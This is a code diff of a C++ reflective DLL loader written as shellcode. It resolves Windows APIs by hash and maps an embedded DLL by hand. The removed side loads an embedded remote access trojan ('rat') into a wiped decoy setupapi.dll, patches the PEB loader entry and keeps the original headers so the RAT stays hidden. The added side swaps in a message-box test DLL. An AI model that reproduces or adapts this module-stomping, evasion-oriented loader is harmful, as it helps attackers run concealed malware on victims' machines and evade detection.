@@ -1,43 +1,44 @@
 #include "freshrdi.hpp"
+#include "messagebox.dll.hpp"
 #include <al/al.hpp>
 #include <algorithm>
 
-data_dirs parse_data(headers pe) {
+data_dirs parse_data(headers* pe) {
     data_dirs data{};
 
-    PIMAGE_DATA_DIRECTORY dir = &pe.data[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    PIMAGE_DATA_DIRECTORY dir = &pe->data[IMAGE_DIRECTORY_ENTRY_BASERELOC];
     if (dir->Size && dir->VirtualAddress) {
-        data.relocations = reinterpret_cast<PIMAGE_BASE_RELOCATION>(pe.va + dir->VirtualAddress);
+        data.relocations = reinterpret_cast<PIMAGE_BASE_RELOCATION>(pe->va + dir->VirtualAddress);
     }
 
-    dir = &pe.data[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    dir = &pe->data[IMAGE_DIRECTORY_ENTRY_IMPORT];
     if (dir->Size && dir->VirtualAddress) {
-        data.imports = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(pe.va + dir->VirtualAddress);
+        data.imports = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(pe->va + dir->VirtualAddress);
     }
 
-    dir = &pe.data[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    dir = &pe->data[IMAGE_DIRECTORY_ENTRY_EXPORT];
     if (dir->Size && dir->VirtualAddress) {
-        data.exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(pe.va + dir->VirtualAddress);
+        data.exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(pe->va + dir->VirtualAddress);
     }
 
-    dir = &pe.data[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
+    dir = &pe->data[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
     if (dir->Size && dir->VirtualAddress) {
-        data.load_config = reinterpret_cast<PIMAGE_LOAD_CONFIG_DIRECTORY>(pe.va + dir->VirtualAddress);
+        data.load_config = reinterpret_cast<PIMAGE_LOAD_CONFIG_DIRECTORY>(pe->va + dir->VirtualAddress);
     }
 
-    dir = &pe.data[IMAGE_DIRECTORY_ENTRY_TLS];
+    dir = &pe->data[IMAGE_DIRECTORY_ENTRY_TLS];
     if (dir->Size && dir->VirtualAddress) {
-        data.tls = reinterpret_cast<PIMAGE_TLS_DIRECTORY>(pe.va + dir->VirtualAddress);
+        data.tls = reinterpret_cast<PIMAGE_TLS_DIRECTORY>(pe->va + dir->VirtualAddress);
     }
 
-    dir = &pe.data[IMAGE_DIRECTORY_ENTRY_TLS];
+    dir = &pe->data[IMAGE_DIRECTORY_ENTRY_TLS];
     if (dir->Size && dir->VirtualAddress) {
-        data.tls = reinterpret_cast<PIMAGE_TLS_DIRECTORY>(pe.va + dir->VirtualAddress);
+        data.tls = reinterpret_cast<PIMAGE_TLS_DIRECTORY>(pe->va + dir->VirtualAddress);
     }
 
-    dir = &pe.data[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+    dir = &pe->data[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
     if (dir->Size && dir->VirtualAddress) {
-        data.exceptions = reinterpret_cast<PIMAGE_RUNTIME_FUNCTION_ENTRY>(pe.va + dir->VirtualAddress);
+        data.exceptions = reinterpret_cast<PIMAGE_RUNTIME_FUNCTION_ENTRY>(pe->va + dir->VirtualAddress);
         data.exceptions_size = dir->Size;
     }
 
@@ -60,60 +61,48 @@ headers parse_headers(void* base) {
     return h;
 }
 
-extern "C" shellcode_result entry() {
-    shellcode_result result{
-        .err = error::SUCCESS
-    };
-
+extern "C" error entry() {
     // Parse the unmapped PE
-    headers rat_headers = parse_headers(embedded::rat.data());
+    headers dll_headers = parse_headers(embedded::messagebox.data());
 
     auto ntdll = GM(L"ntdll.dll", al::by_djb2);
     if (!ntdll) {
-        result.err = error::NTDLL;
-        return result;
+        return error::NTDLL;
     }
 
     auto kernel32 = GM(L"KERNEL32.DLL", al::by_djb2);
     if (!kernel32) {
-        result.err = error::KERNEL32;
-        return result;
+        return error::KERNEL32;
     }
 
     auto kernelbase = GM(L"kernelbase.dll", al::by_djb2);
     if (!kernelbase) {
-        result.err = error::KERNELBASE;
-        return result;
+        return error::KERNELBASE;
     }
 
     auto virtual_alloc = GP(kernel32, VirtualAlloc, al::by_djb2);
     if (!virtual_alloc) {
-        result.err = error::VIRTUALALLOC;
-        return result;
+        return error::VIRTUALALLOC;
     }
 
     auto get_module_handle = GP(kernel32, GetModuleHandleA, al::by_djb2);
     if (!get_module_handle) {
-        result.err = error::GETMODULEHANDLEA;
-        return result;
+        return error::GETMODULEHANDLEA;
     }
 
     auto load_library = GP(kernel32, LoadLibraryA, al::by_djb2);
     if (!load_library) {
-        result.err = error::LOADLIBRARYA;
-        return result;
+        return error::LOADLIBRARYA;
     }
 
     auto get_proc_address = GP(kernel32, GetProcAddress, al::by_djb2);
     if (!get_proc_address) {
-        result.err = error::GETPROCADDRESS;
-        return result;
+        return error::GETPROCADDRESS;
     }
 
     auto virtual_protect = GP(kernel32, VirtualProtect, al::by_djb2);
     if (!virtual_protect) {
-        result.err = error::VIRTUALPROTECT;
-        return result;
+        return error::VIRTUALPROTECT;
     }
 
     auto flush_instruction_cache = GP(
@@ -122,14 +111,12 @@ extern "C" shellcode_result entry() {
         al::by_djb2
     );
     if (!flush_instruction_cache) {
-        result.err = error::FLUSHINSTRUCTIONCACHE;
-        return result;
+        return error::FLUSHINSTRUCTIONCACHE;
     }
 
     auto add_function_table = GP(kernel32, RtlAddFunctionTable, al::by_djb2);
     if (!add_function_table) {
-        result.err = error::RTLADDFUNCTIONTABLE;
-        return result;
+        return error::RTLADDFUNCTIONTABLE;
     }
 
     auto set_process_valid_call_targets = GP(
@@ -138,94 +125,38 @@ extern "C" shellcode_result entry() {
         al::by_djb2
     );
     if (!set_process_valid_call_targets) {
-        result.err = error::SETPROCESSVALIDCALLTARGETS;
-        return result;
+        return error::SETPROCESSVALIDCALLTARGETS;
     }
 
-    HMODULE decoy = GM(L"setupapi.dll", al::by_djb2);
-    if (!decoy) {
-        result.err = error::DECOYDLL;
-        return result;
-    }
-    headers host_headers = parse_headers(decoy);
-
-    // May not need to do all of this anymore.
-    PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
-    auto links = al::peb::memory_order_links(peb);
-    auto found = std::ranges::find_if(
-        links,
-        al::by_djb2(L"setupapi.dll"),
-        al::peb::entry_to_name
-    );
-    if (links.end() == found) {
-        result.err = error::DECOYDLL;
-        return result;
-    }
-    found->EntryPoint = reinterpret_cast<PLDR_INIT_ROUTINE>(host_headers.va + rat_headers.opt->AddressOfEntryPoint);
-
-    unsigned long old;
-    if (!virtual_protect(
-        host_headers.base,
-        host_headers.opt->SizeOfImage,
-        PAGE_READWRITE,
-        &old
-    )) {
-        result.err = error::FAIL_PROTECT;
-        return result;
-    }
-
-    // Saving the host DLL's headers to hide the RAT's later. We can't leave
-    // them in place since we are relying on the loader to call the
-    // entrypoint.
-    auto og_headers_buf = static_cast<std::byte*>(virtual_alloc(
+    void* buf = virtual_alloc(
         nullptr,
-        host_headers.opt->SizeOfHeaders,
+        dll_headers.opt->SizeOfImage,
         MEM_RESERVE | MEM_COMMIT,
         PAGE_READWRITE
-    ));
-
-    std::copy_n(
-        host_headers.base,
-        host_headers.opt->SizeOfHeaders,
-        static_cast<std::byte*>(og_headers_buf)
     );
-    result.module_base = host_headers.base;
-    result.module_size = host_headers.opt->SizeOfImage;
-    result.og_headers = og_headers_buf;
-    result.og_headers_size = host_headers.opt->SizeOfHeaders;
+    if (!buf) {
+        return error::VIRTUALALLOC;
+    }
+    auto va = reinterpret_cast<uintptr_t>(buf);
 
-    // Wipe the host DLL entirely. The PE pointers in host_headers are now
-    // invalid.
-    std::fill_n(
-        reinterpret_cast<unsigned char*>(host_headers.base),
-        host_headers.opt->SizeOfImage,
-        0
-    );
-
-    // Map the RAT headers in immediately and account for their new VA.
-    std::copy_n(
-        rat_headers.base,
-        rat_headers.opt->SizeOfHeaders,
-        host_headers.base
-    );
+    // Map the payload headers in immediately and account for their new VA.
+    std::copy_n(dll_headers.base, dll_headers.opt->SizeOfHeaders, static_cast<std::byte*>(buf));
 
     // Track the delta needed for our relocation adjustments.
-    ptrdiff_t delta = host_headers.va - rat_headers.opt->ImageBase;
+    ptrdiff_t delta = va - dll_headers.opt->ImageBase;
 
     // Map the raw sections to their respective virtual addresses.
-    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(rat_headers.nt);
-    for (unsigned short i = 0; i < rat_headers.file->NumberOfSections; ++i) {
+    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(dll_headers.nt);
+    for (unsigned short i = 0; i < dll_headers.file->NumberOfSections; ++i) {
         std::copy_n(
-            reinterpret_cast<std::byte*>(rat_headers.va + sections[i].PointerToRawData),
+            reinterpret_cast<std::byte*>(dll_headers.va + sections[i].PointerToRawData),
             sections[i].SizeOfRawData,
-            reinterpret_cast<std::byte*>(host_headers.va + sections[i].VirtualAddress)
+            reinterpret_cast<std::byte*>(va + sections[i].VirtualAddress)
         );
     }
 
-    // Parse the data directories based on their mapped sections.
-    rat_headers.va = host_headers.va;
-    rat_headers.base = host_headers.base;
-    data_dirs data = parse_data(rat_headers);
+    headers new_headers = parse_headers(buf);
+    data_dirs data = parse_data(&new_headers);
 
     // Process relocations
     if (delta && data.relocations) {
@@ -238,7 +169,7 @@ extern "C" shellcode_result entry() {
 
             // Loop over relocations in the block
             for (; n > 0; --n) {
-                auto ptr = reinterpret_cast<uintptr_t*>(host_headers.va + data.relocations->VirtualAddress + reloc->Offset);
+                auto ptr = reinterpret_cast<uintptr_t*>(va + data.relocations->VirtualAddress + reloc->Offset);
 
                 switch (reloc->Type) {
                 case IMAGE_REL_BASED_DIR64:
@@ -269,18 +200,16 @@ extern "C" shellcode_result entry() {
     // them.
     if (data.imports) {
         while (data.imports->Characteristics) {
-            auto og_first_thunk = reinterpret_cast<PIMAGE_THUNK_DATA>(host_headers.va + data.imports->OriginalFirstThunk);
-            auto first_thunk = reinterpret_cast<PIMAGE_THUNK_DATA>(host_headers.va + data.imports->FirstThunk);
+            auto og_first_thunk = reinterpret_cast<PIMAGE_THUNK_DATA>(va + data.imports->OriginalFirstThunk);
+            auto first_thunk = reinterpret_cast<PIMAGE_THUNK_DATA>(va + data.imports->FirstThunk);
 
             // We do not want to call LoadLibrary during the verifier
             // notification. Instead, we rely on these DLLs already being
             // brought in by the loader DLL.
-            HMODULE dll = get_module_handle(reinterpret_cast<const char*>(host_headers.va + data.imports->Name));
+            HMODULE dll = load_library(reinterpret_cast<const char*>(va + data.imports->Name));
 
             if (!dll) {
-                result.err = error::FAIL_LOAD_LIBRARY;
-                result.err_string = reinterpret_cast<const char*>(host_headers.va + data.imports->Name);
-                return result;
+                return error::FAIL_LOAD_LIBRARY;
             }
 
             for (; og_first_thunk->u1.Function; ++first_thunk, ++og_first_thunk) {
@@ -290,23 +219,20 @@ extern "C" shellcode_result entry() {
                         MAKEINTRESOURCEA(og_first_thunk->u1.Ordinal)
                     );
                     if (!address) {
-                        result.err = error::FAIL_GET_PROC;
-                        return result;
+                        return error::FAIL_GET_PROC;
                     }
 
                     first_thunk->u1.Function = reinterpret_cast<uintptr_t>(address);
                 }
                 else {
-                    auto named_import = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(host_headers.va + og_first_thunk->u1.AddressOfData);
+                    auto named_import = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(va + og_first_thunk->u1.AddressOfData);
 
                     FARPROC address = get_proc_address(
                         dll,
                         static_cast<const char*>(named_import->Name)
                     );
                     if (!address) {
-                        result.err = error::FAIL_GET_PROC;
-                        result.err_string = static_cast<const char*>(named_import->Name);
-                        return result;
+                        return error::FAIL_GET_PROC;
                     }
 
                     first_thunk->u1.Function = reinterpret_cast<uintptr_t>(address);
@@ -319,7 +245,7 @@ extern "C" shellcode_result entry() {
     // Adjust section memory protections
     bool r, w, x;
     unsigned long protect;
-    for (unsigned short i = 0; i < rat_headers.file->NumberOfSections; ++i) {
+    for (unsigned short i = 0; i < dll_headers.file->NumberOfSections; ++i) {
         if (sections[i].SizeOfRawData) {
             // determine protection flags based on characteristics
             bool r = (sections[i].Characteristics & IMAGE_SCN_MEM_READ) != 0;
@@ -349,37 +275,37 @@ extern "C" shellcode_result entry() {
         }
 
         if (!virtual_protect(
-            reinterpret_cast<void*>(host_headers.va + sections[i].VirtualAddress),
+            reinterpret_cast<void*>(va + sections[i].VirtualAddress),
             sections[i].SizeOfRawData,
             protect,
             &protect
         )) {
-            result.err = error::FAIL_PROTECT;
-            return result;
+            return error::FAIL_PROTECT;
         }
     }
 
     // Flush instruction cache
     // -1 is pseudo handle to current process.
     if (!flush_instruction_cache(reinterpret_cast<HANDLE>(-1), NULL, 0)) {
-        result.err = error::FAIL_FLUSH_CACHE;
-        return result;
+        return error::FAIL_FLUSH_CACHE;
     }
 
     auto entry = reinterpret_cast<PIMAGE_CFG_ENTRY>(data.load_config->GuardCFFunctionTable);
-    for (size_t i = 0; i <= data.load_config->GuardCFFunctionCount; ++i) {
-        CFG_CALL_TARGET_INFO cfg{
-            .Offset = entry[i].Rva,
-            .Flags = CFG_CALL_TARGET_VALID
-        };
+    if (entry) {
+        for (size_t i = 0; i <= data.load_config->GuardCFFunctionCount; ++i) {
+            CFG_CALL_TARGET_INFO cfg{
+                .Offset = entry[i].Rva,
+                .Flags = CFG_CALL_TARGET_VALID
+            };
 
-        set_process_valid_call_targets(
-            reinterpret_cast<HANDLE>(-1),
-            rat_headers.base,
-            rat_headers.opt->SizeOfImage,
-            1,
-            &cfg
-        );
+            set_process_valid_call_targets(
+                reinterpret_cast<HANDLE>(-1),
+                dll_headers.base,
+                dll_headers.opt->SizeOfImage,
+                1,
+                &cfg
+            );
+        }
     }
 
     // TLS callbacks
@@ -387,32 +313,30 @@ extern "C" shellcode_result entry() {
         auto callback = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(data.tls->AddressOfCallBacks);
 
         for (; *callback; ++callback) {
-            (*callback)(host_headers.base, DLL_PROCESS_ATTACH, nullptr);
+            (*callback)(buf, DLL_PROCESS_ATTACH, nullptr);
         }
     }
 
     // SEH exceptions
     if (data.exceptions)
     {
-        if (!add_function_table(data.exceptions, (data.exceptions_size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) - 1, host_headers.va)) {
-            result.err = error::FAIL_ADD_FUNCTION_TABLE;
-            return result;
+        if (!add_function_table(data.exceptions, (data.exceptions_size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) - 1, va)) {
+            return error::FAIL_ADD_FUNCTION_TABLE;
         }
     }
 
-    // Grabbing a pointer to DllMain so the RAT DLL can be manually
-    // initialized during alternative steps.
-    result.dll_main = reinterpret_cast<dll_main_t>(host_headers.va + rat_headers.opt->AddressOfEntryPoint);
+    auto dll_main = reinterpret_cast<dll_main_t>(va + dll_headers.opt->AddressOfEntryPoint);
+    if (!dll_main(static_cast<HINSTANCE>(buf), DLL_PROCESS_ATTACH, nullptr)) {
+        return error::DLLMAIN;
+    }
 
     // We don't call DllMain because we are overloading early enough to let
     // the OS handle it.
-    auto functions = reinterpret_cast<unsigned long*>(host_headers.va + data.exports->AddressOfFunctions);
-    auto rat_export = reinterpret_cast<decltype(&run)>(host_headers.va + functions[0]);
+    auto functions = reinterpret_cast<unsigned long*>(va + data.exports->AddressOfFunctions);
+    auto rat_export = reinterpret_cast<decltype(&test)>(va + functions[0]);
     if (!rat_export) {
-        result.err = error::RATEXPORT;
-        return result;
+        return error::DLLMAIN;
     }
 
-    result.func = rat_export;
-    return result;
+    return error::SUCCESS;
 }
